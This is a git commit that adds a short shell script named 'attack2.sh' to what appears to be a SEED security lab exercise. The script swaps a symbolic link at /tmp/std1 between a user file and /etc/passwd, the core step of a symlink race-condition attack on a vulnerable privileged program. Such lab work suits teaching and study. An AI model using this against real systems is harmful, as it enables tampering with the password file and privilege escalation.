135da54c256981f06a42e4990f7ce5500b795cd1
Damien Robinson <shadow81627@gmail.com>
2017-02-07 19:42:07 -0800

    Added a new attack file.

---
+++ activity12/attack2.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+
+ln -sf /home/seed/myfile /tmp/std1
+
+# Make a symbolic link between passwd file and std file any change made in one file will reflect in the other.
+ln -sf /etc/passwd /tmp/std1
+
+
+
+
